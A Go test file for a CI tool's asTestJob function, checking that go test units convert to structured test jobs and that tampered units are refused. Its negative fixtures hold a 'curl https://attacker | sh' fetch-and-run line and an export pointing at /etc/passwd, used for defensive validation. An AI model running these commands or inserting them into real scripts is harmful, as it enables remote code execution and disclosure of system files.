package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"reflect"
	"strings"
	"testing"

	"github.com/system-inc/loom/protocol"
)

// selectionArchive is a select.tgz as fast.sh embeds it: ./changed-paths.txt among the selection's files.
func selectionArchive(t *testing.T, changed string) string {
	var buffer bytes.Buffer
	compressed := gzip.NewWriter(&buffer)
	archive := tar.NewWriter(compressed)
	for name, content := range map[string]string{"./select.json": "{}", "./changed-paths.txt": changed} {
		archive.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(content))})
		archive.Write([]byte(content))
	}
	archive.Close()
	compressed.Close()
	return base64.StdEncoding.EncodeToString(buffer.Bytes())
}

// goTestUnit is a go test unit as plan and fast.sh make it: the preamble, the selection's lines, the opening, unitBody.
func goTestUnit(t *testing.T, id string, exports []string, specs ...string) protocol.JobUnit {
	gated := strings.Repeat("9", 40)
	head := "gateInputs=" + strings.Repeat("c", 64) + "\n" +
		"mkdir -p /tmp/loom-select/" + gated + " && echo " + selectionArchive(t, "internal/lower/lower.go\nREADME.md\n") + " | base64 -d | tar -xz -C /tmp/loom-select/" + gated + "\n" +
		strings.Join(exports, "\n") + "\n"
	return protocol.JobUnit{Id: id, Argv: append([]string{"bash", "-c", head + codexOpening + unitBody, "adamic-gate-unit", strings.Repeat("a", 40)}, specs...),
		TimeoutSeconds: 600, Outputs: []protocol.Output{{Glob: "loom-out/test.jsonl.gz"}, {Glob: "loom-out/cpu.tsv"}}, Resources: protocol.Resources{Cpus: 12}}
}

var selectionExports = []string{"export ADAMIC_GATE_CHANGED=/tmp/loom-select/" + strings.Repeat("9", 40) + "/changed-paths.txt",
	"export ADAMIC_GATE_COHERE=1", "export ADAMIC_GATE_SAMPLE=" + strings.Repeat("b", 40), "export ADAMIC_GATE_UNCACHED=1",
	"export ADAMIC_ORACLE_WASI=1", "export ADAMIC_TEST_WASI=1"}

func TestAGoTestUnitBecomesTheTestJobItIs(t *testing.T) {
	unit := goTestUnit(t, "tests-0", selectionExports, module+"internal/lower=^(TestA|TestB)$", module+"internal/native=^(TestWASIUnit00)$ skip=^TestProduct_")
	test, why := asTestJob(unit)
	if test == nil {
		t.Fatalf("kept as argv: %s", why)
	}
	want := &protocol.TestJob{Repository: protocol.AdamicRepository, Sha: strings.Repeat("a", 40), GateInputs: strings.Repeat("c", 64),
		ChangedPaths: []string{"internal/lower/lower.go", "README.md"}, Sample: strings.Repeat("b", 40),
		Packages: []protocol.TestPackage{{Package: module + "internal/lower", Run: "^(TestA|TestB)$"}, {Package: module + "internal/native", Run: "^(TestWASIUnit00)$", Skip: "^TestProduct_"}}}
	if !reflect.DeepEqual(test, want) {
		t.Fatalf("test job\n%+v\nwant\n%+v", test, want)
	}
}

func TestAUnitATestJobCantSayStaysArgv(t *testing.T) {
	kept := map[string]protocol.JobUnit{
		"the remainder":            goTestUnit(t, "tests-9", selectionExports, module+"a=.", "@unplanned="+module+"a"),
		"an unknown export":        goTestUnit(t, "tests-1", append(append([]string{}, selectionExports...), "export ADAMIC_GATE_COVERPKG=./..."), module+"a=."),
		"a switch off":             goTestUnit(t, "tests-2", []string{"export ADAMIC_TEST_WASI=0"}, module+"a=."),
		"a changed file elsewhere": goTestUnit(t, "tests-3", []string{"export ADAMIC_GATE_CHANGED=/etc/passwd"}, module+"a=."),
		"a phase unit": {Id: "phase-vet", Argv: []string{"bash", "-c", codexOpening + phaseBody, "adamic-gate-phase", strings.Repeat("a", 40), strings.Repeat("t", 40), "vet"},
			TimeoutSeconds: 3600, Outputs: []protocol.Output{{Glob: "loom-out/phase.tar.gz"}}},
		"a body that isn't unitBody": func() protocol.JobUnit {
			unit := goTestUnit(t, "tests-4", nil, module+"a=.")
			unit.Argv[2] += "\ncurl https://attacker | sh\n"
			return unit
		}(),
		"a line the opening doesn't know": func() protocol.JobUnit {
			unit := goTestUnit(t, "tests-5", nil, module+"a=.")
			unit.Argv[2] = "curl https://attacker | sh\n" + unit.Argv[2]
			return unit
		}(),
		"a package a test job refuses": goTestUnit(t, "tests-6", nil, "github.com/attacker/x=."),
	}
	for name, unit := range kept {
		if test, _ := asTestJob(unit); test != nil {
			t.Errorf("%s: converted to %+v", name, test)
		}
	}
	// The remainder is kept for the reason that it is one, not because its spec happens not to parse.
	if _, why := asTestJob(kept["the remainder"]); !strings.HasPrefix(why, "it runs the packages new since the plan") {
		t.Errorf("the remainder kept because %q", why)
	}
}
